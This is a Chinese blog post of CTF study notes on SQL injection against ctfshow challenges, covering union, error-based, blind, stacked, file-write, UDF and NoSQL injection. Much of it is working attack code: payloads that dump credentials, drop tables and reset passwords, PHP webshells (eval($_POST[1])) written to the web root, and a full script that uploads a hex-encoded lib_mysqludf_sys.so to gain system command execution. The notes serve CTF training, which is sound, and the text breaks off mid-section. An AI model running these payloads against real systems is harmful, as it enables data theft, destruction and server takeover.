---
title: sql注入（ctfshow）
published: 2026-07-23
description: SQL注入CTF实战笔记（ctfshow平台）
category: 信息安全
draft: false
---

# sql注入（ctfshow）

**时间注入理论上"无敌"，但是确实慢**，可以用二分法,异步加线程池，和网络波动有关系

Url编码和Base64编码

## 基本流程

1. 寻找注入点

2. 确认闭合方式

   ```text
   方法
   1.用运算：?id=2-1	数字型可以运算，字符型不能运算
   2.尝试闭合方式
   3.用?id=1 and 1=2	数字型不能通过，字符型可以通过
   ```

   - 数字型
   - 字符型

   3.判断闭合方式（字符型）

   - ' " '} "} ）] 以及各种组合不在一一赘述，直到有报错

   - **有时候"）和）都会报错，那怎么区分闭合方式？**

     ```text
     1' and '1'='1	如果页面正常显示，说明 ' 成功闭合了前面的引号，并且 and '1'='1' 被当作SQL逻辑执行了。那么闭合方式就是 单引号 '。
     1') and ('1'='1	如果页面正常显示，说明闭合方式是 单引号+右括号 ')。
     ```

   4.获取基本信息

   数据库（schema）-表名(table)-字段名(column)-数据

   ```text
   #判断列数
   id=1' order by 3 -- +	id=1' group by 3 -- + 
   #确定回显位置
   id=-1' union select 1,2,3 -- +
   #获取数据库元数据
   id=-1' union select 1,2,database() -- +	获取数据库名
   id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='数据库' -- +	获取表名
   id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表' and table_schema='数据库' -- +	获取列名
   id=-1' union select 1,2,concat(username, ':', password) from 数据库.表 -- +	获取目标数据
   ```

## 基本思路

- 联合查询、报错、布尔盲注、时间盲注、堆叠

1.有回显：直接注入

2.无回显：有报错信息：报错注入

3.无回显：无报错信息：盲注（布尔注入与时间注入），根据是否有不同的页面

关于注释的话可以使用-- a(a前面有一个空格)或-- +（+前面有一个空格）（POST传参时可能会失效），#

- 长度限制：concat('~', substr((查询语句), 1, 31)

  > concat()和group_concat()为拼接语句

### 报错注入

 `extractvalue()` 函数的报错信息有**长度限制**（通常约 32 个字符）

- 可以用 `substr()` 分段截取
- 可以用 `limit` 逐条获取

可以用的报错注入函数

- extractvalue()
- updatexml()
- floor()
- ceil()
- round()

```text
基本格式
?id=' or updatexml(1, concat(0x7e, database(), 0x7e), 1)%23
?id=' or extractvalue(1, concat(0x7e, database(), 0x7e))
?id=' union select 1, count(*), concat(0x7e, database(), 0x7e, floor(rand(0)*2))a from information_schema.tables group by a --+

这里的information_schema.tables也可以写成information_schema.columns，两者都是数据源的意思
```

#### limit注入

```sql
用来在 LIMIT 子句之后进行报错注入
PROCEDURE ANALYSE() 注入只对 MySQL 5.0.0 到 5.6.5 版本有效

#extractvalue(rand(), concat(0x3a, database()))：extractvalue() 是一个 XML 函数，其第二个参数应当是一个合法的 XPath 路径。当提供的路径格式错误时，MySQL 会报错并显示出错误的路径内容。
#procedure analyse(...):MySQL 的存储过程分析子句,在 LIMIT 后面可以接的语法，用于让数据库执行一个"过程"。
?page=10&limit=10 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)
这里的0x3a是`:`(XPath不接受的特殊字符)，用来狗证非法的XPath路径
```

#### group注入

group by存在**主键冲突**的问题

```sql
题目
$sql = select * from ctfshow_user group by $username;

?u=rand(0) or (select count(*) from information_schema.tables group by concat(database(), floor(rand(0)*2)))
#执行过程：group by concat(database(), floor(rand(0)*2)) 在分组时，会计算 concat 的值。由于 floor(rand(0)*2) 会生成 0, 1, 1, 0... 这样的序列，导致分组主键重复，从而触发 Duplicate entry 错误，进而带出数据。

#floor()是向下取整的意思，结果非 0 即 1，形成一个 0, 1, 1, 0... 的序列。
#虚拟表的主键就是 group by 后面的字段，主键不允许重复。关键点在于，group by 会计算两次 concat(database(), floor(rand(0)*2)) 的值。
```



### 布尔盲注

有不同的页面信息可以做判断（用来写脚本）

**这里写脚本的时候要注意**：不要连续（不留sleep）访问，WAF 或 PHP 配置可能限制了请求速率，会因为**请求频率过快，触发了服务端的连接限制**，或者**部分 Payload 导致 PHP 进程崩溃**。

- **降低请求频率**：time.sleep(0.2)  

- **添加重试机制**:

  ```python
  def inject(payload, retries=3):
      """发送POST请求并返回响应文本，失败时重试"""
      for attempt in range(retries):
          try:
              r = requests.post(URL, data={"tableName": payload}, timeout=5)
              return r.text
          except Exception as e:
              print(f"[!] 请求出错 (尝试 {attempt+1}/{retries}): {e}")
              time.sleep(1)  # 等待 1 秒后重试
      return ""
  ```

> 关键是：有不同的页面信息，有咳哟用的条件函数

```php
[闭合方式] and [条件函数] = '[目标值]' #
```

```php
sql = f"select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg' and table_schema='ctfshow_web' "
payload = f"admin' and mid(({sql}) FROM {len(flag) + 1} FOR 1) = '{c}' #"
```

这里注意一下ctfshow_web是被单引号包裹

```php
sql = f"select f1ag from ctfshow_flxg "
payload = f"admin' and mid(({sql}) FROM {len(flag) + 1} FOR 1) = '{c}' #"
```

这里没有提到` table_schema`和 `table_table`不用单引号

```php
# 构造payload：使用括号包裹表名，用left截取并比对
(ctfshow_user)where(left(pass,{len(flag) + 1}))like'{flag}{c}'
#{}为占位符，
admin\' and (select f1ag from ctfshow_fl0g) regexp \'{}\' #'.format(flag + c)
```



| 函数                         | 用途                  | 示例                                                     |
| :--------------------------- | :-------------------- | :------------------------------------------------------- |
| `left(字符串, 长度)`         | 从左侧截取指定长度    | `left((select f1ag from ctfshow_flxg), 5) = 'ctfsh'`     |
| `substr(字符串, 位置, 长度)` | 从指定位置截取        | `substr((select f1ag from ctfshow_flxg), 1, 1) = 'c'`    |
| `mid(字符串, 位置, 长度)`    | 同 `substr`           | `mid((select f1ag from ctfshow_flxg), 1, 1) = 'c'`       |
| `lpad(字符串, 长度, '')`     | 左填充，可替代 `left` | `lpad((select f1ag from ctfshow_flxg), 5, '') = 'ctfsh'` |
| `regexp '模式'`              | 正则匹配              | `(select f1ag from ctfshow_flxg) regexp '^ctfsh'`        |
| `like '模式%'`               | 模糊匹配              | `(select f1ag from ctfshow_flxg) like 'ctfsh%'`          |
| `ascii(substr(...))`         | 逐位比较 ASCII 码     | `ascii(substr((...),1,1)) = 99`                          |



### 堆叠注入

一种 SQL 注入攻击技术，攻击者通过在原有 SQL 语句结束后使用**分号（`;`）** 作为分隔符，来**连续执行多条任意 SQL 语句**

```php
更新 admin 用户的密码
1;update`ctfshow_user`set`pass`=1
表名和字段名可以用反引号来表示

0;select(1)		前面尽量用0，这样第一个语句查询的结果更干净
    
逻辑验证（前提是知道了表名）
username: 1;show tables password: ctfshow_user

添加表的数据
0;insert ctfshow_user (username,pass)values(123,666)
删表
0;drop table ctfshow_user;create table ctfshow_user(username varchar(100),pass varchar(100));insert ctfshow_user(username,pass) value (1,2);
这样数据库中的 ctfshow_user 表只有一条数据：username=1，pass=2
    
alter修改字段（修改默认密码）
0;alter table ctfshow_user drop pass;alter table ctfshow_user add pass int default 1
```

```php
#预编译 + 十六进制编码（伟大无需多言）
username=0;prepare stmt from 0x696e736572742063746673686f775f7573657228757365726e616d652c70617373292076616c75657328312c3229;execute stmt;&password=0
这里的十六进制编码是insert ctfshow_user(username,pass) values(1,2)
    
这里的prepare是 MySQL 的一个预处理语句命令,负责将你提供的十六进制 SQL 代码"编译"成一个可执行的语句。
stmt 是 prepare 为这条预处理语句起的名字，相当于一个变量名或句柄。
prepare 是定义，stmt 是名字，execute 是执行。
```

```sql
#过滤select
- 可以用handler:打开、读取、关闭数据表(前面用show查询结构，后面用handler来查询数据)
username=ctfshow';show tables from ctfshow_web;
username=ctfshow';show columns from ctfshow_web.ctfshow_flagasa;
username=ctfshow';handler ctfshow_flagasa open;handler ctfshow_flagasa read first;

- 可以用预处理
1';PREPARE stmt FROM concat('s','elect flagas from ctfshow_flagasa');EXECUTE stmt;
```



### 时间盲注

在写python脚本的时候sleep和threshold的值很重要

sleep：延时时间不能太短（会被网络波动淹没），也不能太长（影响效率）

```python
import requests
import time

url = "http://24ba5219-cc73-4243-af6b-3c3430fc4973.challenge.ctf.show/api/"
charset = "0123456789abcdefghijklmnopqrstuvwxyz-_{}"

def inject(payload):
    start = time.time()
    try:
        requests.post(url, data={"ip": payload, "debug": 0}, timeout=5)
    except:
        pass
    return time.time() - start

def blind(sql, length):
    res = ""
    for i in range(1, length + 1):
        for c in charset:
            payload = f"if(mid(({sql}),{i},1)='{c}',sleep(3),1)"
            if inject(payload) >= 2.5:
                res += c
                print(f"[+] 第{i}位: {c} → {res}")
                break
    return res
'''
# 第一步：爆表名
print("[*] 爆破表名...")
tables = blind("select group_concat(table_name) from information_schema.tables where table_schema=database()", 50)
print(f"[+] 表名: {tables}")
'''
# 第二步：爆字段名（使用已知的目标表名 ctfshow_flagx）
#print("[*] 爆破字段名...")
target_table = "ctfshow_flagx"  # 根据题解直接指定
#columns = blind(f"select group_concat(column_name) from information_schema.columns where table_name='{target_table}'", 50)
#print(f"[+] 字段: {columns}")

# 第三步：爆数据（使用已知的目标字段 flaga）
print("[*] 爆破 flag...")
target_column = "flaga"  # 根据题解直接指定
flag = blind(f"select {target_column} from {target_table}", 60)
print(f"[+] Flag: {flag}")
```

#### sleep被禁

- 可以选择**benchmark()**: 通过重复执行表达式来消耗时间，可以达到类似 `sleep` 的延迟效果。

  ```python
  payload = f"1 and if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxcc),{i},1))<{mid}, BENCHMARK(10000000, MD5('a')), 0)"
  相当于重复计算 MD5('a') 一千万次，消耗时间
  有师傅建议说benchmark后面的数不要太大
  ```

- 使用 **`REPEAT()` + `LENGTH()`** 组合

  ```python
  id = 1 and if(1=1, BENCHMARK(10000000, MD5('a')), 0)
  ```

- 笛卡尔积（多表联合查询）

  ```python
  id = 1 and if(1=1, (SELECT count(*) FROM information_schema.tables A, information_schema.tables B), 0)
  #A 表有 N 行，B 表有 N 行
  #笛卡尔积结果 = N × N 行
  ```

- 正则表达式回溯

  ```python
  (select concat(repeat(concat("1",repeat("a",200)),5)) regexp concat(repeat("(a.*)+",1), "b"))
  ```

#### 终极禁用

```text
function waf($str){
        return preg_match('/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i',$str);
}  
```

asccii被ban用regexp，substr和mid被ban用left,，concat被ban用limit

```python
payload = {
'ip': f"'') or if(left((select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1),{i})regexp('{str+j}'),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),'False')#",
     'debug': 0
}
```



## 其他注入

### 无列名注入

给未知列"贴标签"的方式，绕过了不知道`table_name`表里列名的限制

```sql
(select `2` from (select 1,2,3 union select * from flag23a1)a limit 1,1)
```

### Updata和Insert

构造闭合，利用堆叠注入的方式或注释的方式，进行sql命令执行



### Delete

`UNION SELECT`不能使用，因为DELETE不返回结果集

布尔盲注：可能还没出完数据就全删完了

可以用时间盲注

### File

**写入恶意文件到服务器**

```sql
$sql = "select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';";
```

1. **写入一句话木马**（拿到shell）
2. **写入flag到可访问目录**（直接访问）
3. **读取敏感文件**（如果配合load_file）

#### `LINES STARTING BY`

```sql
select * from ctfshow_user into outfile '/var/www/html/dump/1.php' LINES STARTING BY '<?php eval($_POST[1]);?>';
LINES STARTING BY 指定了每一行输出内容的前缀。
加上 LINES STARTING BY 后：
行1: <?php eval($_POST[1]);?>1 admin password123
行2: <?php eval($_POST[1]);?>2 user1 pass456

遇到第一个 <?php eval($_POST[1]);?> → 执行 eval($_POST[1])
后面的 1 admin password123 被当作纯文本输出
继续执行第二个 <?php eval($_POST[1]);?> → 再次执行 eval($_POST[1])
```

####  `LINES TERMINATED BY` 注入

`LINES TERMINATED BY` 是在**每行末尾**添加内容。

```sql
filename=1.php' LINES TERMINATED BY '<?php eval($_POST[1]);?>'#

1 admin password123<?php eval($_POST[1]);?>
2 user1 pass456<?php eval($_POST[1]);?>
3 user2 pass789<?php eval($_POST[1]);?>
```

### UDF(用户自定义函数)注入

**需要更高的权限（通常是root权限）**

**利用 MySQL 的 `CREATE FUNCTION` 功能，通过 SQL 注入点上传恶意动态库，进而在服务器上执行系统命令获取 Flag。**

UDF（User Defined Function）是MySQL允许用户自行添加的扩展函数，可以是一个`.dll`（Windows）或`.so`（Linux）文件。

```text
注入点 → 写入文件 → 加载 UDF → 执行命令 → 获取 Flag
```

```python
import requests
url='http://a05a5dd5-db32-4a29-8659-954a6130d759.challenge.ctf.show/api/'
#注意没有0x
payloads='7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004989c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000'

#将超长的十六进制字符串（约 60 万字符）分割成每段 2000 字符的小块
#GET 请求 URL 有长度限制（一般 2048-8000 字符）
#分段后每次只发送 2000 字符，避免 URL 被截断

payloads_list=[]
for i in range(0,len(payloads),2000):
    end=i+2000
    payloads_list.append(payloads[i:end])
#?id=1%27;select+'123'+into+dumpfile+'/tmp/aaa.txt'%3b%23 尝试写入文件bp处理
#?id=1';select+load_file('/tmp/aaa.txt')%3b%23  判断是否成功写入文件

#写入；临时文件
count=0 #一共9段
for text in payloads_list:
    count+=1
    url1=url+f"?id=1%27;select+'{text}'+into+dumpfile+'/tmp/{count}.txt'%3b%23"
    res1=requests.get(url=url1)
    print("**"+str(res1.status_code)+"**",end='')
    if res1.status_code ==200:
        url2=url+f"?id=1';select+load_file('/tmp/{count}.txt')%3b%23"
        res2=requests.get(url=url2)
        if "load_file" in res2.text:
            print(f"Success dumpfile {count}.txt")

#合并生成SO文件            
url3=url+"?id=1';select unhex(concat(load_file('/tmp/1.txt'),load_file('/tmp/2.txt'),load_file('/tmp/3.txt'),load_file('/tmp/4.txt'),load_file('/tmp/5.txt'),load_file('/tmp/6.txt'),load_file('/tmp/7.txt'),load_file('/tmp/8.txt'),load_file('/tmp/9.txt'))) into dumpfile '/usr/lib/mariadb/plugin/udf.so'%3b%23"
#resquests中的get会自动对空格进行处理 可以不处理空格
res3=requests.get(url=url3)
if res3.status_code==200:
    url4=url+"?id=1';select load_file('/usr/lib/mariadb/plugin/udf.so')%3b%23"
    res4=requests.get(url=url4)
    print(res4.text)
    if "load_file" in res4.text:
        print("成功写入恶意so文件 位于 '/usr/lib/mariadb/plugin/udf.so'")
cmd='cat /f*'

#创建UDF函数
url5=url+"?id=1';create function sys_eval returns string soname 'udf.so'%3b%23"
res5=requests.get(url=url5)
if res5.status_code ==200:
    print("*创建函数sys_eval()成功*")

#尝试执行系统命令
url6=url+f"?id=1';select sys_eval('{cmd}')%3b%23"
res6=requests.get(url=url6)
print(res6.text)
```

```text
payloads='7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e818...'
 这是 UDF 动态库文件的十六进制表示（去掉 0x 前缀）。
 这是 Metasploit 框架中 lib_mysqludf_sys.so 文件的十六进制编码。它包含了 sys_eval、sys_exec、sys_get 等函数的实现。十六进制字符串后，可以通过 SQL 语句写入文件（二进制不可以）
```

**把一段能执行系统命令的恶意代码（UDF库）分段写入服务器，合并成完整文件后加载成函数，最后调用这个函数执行 `cat /f\*` 拿到Flag。**



### nosql

**NoSQL = Not Only SQL**，泛指非关系型数据库。

#### **Memcache**（内存缓存系统）

**键值对（Key-Value）缓存系统**，不执行 SQL 语句，而是通过键（Key）来存取数据。

主要是**构造恶意的键名**，进行键名注入

- 可以使用批量爆破（使用python函数进行猜测键名）



```text
 题目（无过滤）
 $user = $memcache->get($id);
```

```text
# 访问
http://xxx/api/?id[]=flag

# PHP 执行
$id = ['flag'];  // 变成了数组！
$user = $memcache->get(['flag']);  // 返回键名为 "flag" 的数据
```

####  MongoDB NoSQL注入

主要是**逻辑漏洞**

MongoDB 使用 **BSON 格式** 的数组作为查询条件

三种格式：

- JSON 格式（如果接收 JSON）

  ```text
  {"username": {"$ne": null}}
  ```

- URL 编码（如果是 GET/POST）

  ```text
  ?data={"username":{"$ne":null}}
  ```

- 数组形式（如果是表单）

  ```text
  data[username][$ne]=null
  ```

注入方式

- **操作符注入**:攻击者可以注入像 `$ne`（不等于）、`$gt`（大于）、`$regex`（正则匹配）这类查询操作符来彻底改变查询意图。

  ```text
  在登录时，将密码字段构造为{"$ne": ""},查询条件就变成了"匹配所有密码不为空的用户"，从而绕过密码验证，实现任意用户登录.
  ```

- **语法注入**:这通常发生在 `$where` 子句中，因为该子句允许执行JavaScript表达式。

  ```text
